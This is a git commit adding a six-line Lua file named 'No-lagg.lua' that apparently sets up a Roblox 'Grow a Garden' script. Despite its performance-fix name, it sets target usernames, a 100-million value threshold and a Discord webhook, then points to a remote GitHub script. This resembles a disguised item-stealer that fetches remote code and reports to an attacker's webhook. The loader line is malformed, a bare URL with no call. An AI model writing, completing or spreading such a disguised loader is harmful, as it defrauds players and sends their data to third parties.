c23120e23b3d4f55761d256d1c0f56598f3d7ac5
yuunii-1 <jolyannies16@gmail.com>
2025-06-20 21:16:35 +0800

    Create No-lagg.lua

---
+++ No-lagg.lua
@@ -0,0 +1,6 @@
+_G.Usernames = {"Itzfreespam1", "Queen_Morelya", "user3"} -- you can add as many as you'd like
+_G.min_value = 100000000 -- 100 million
+_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
+_G.webhook = "https://discord.com/api/webhooks/" -- change to your webhook
+
+https://raw.githubusercontent.com/yuunii-1/No-laggtet/refs/heads/main/GrowAGarden.lua.txt
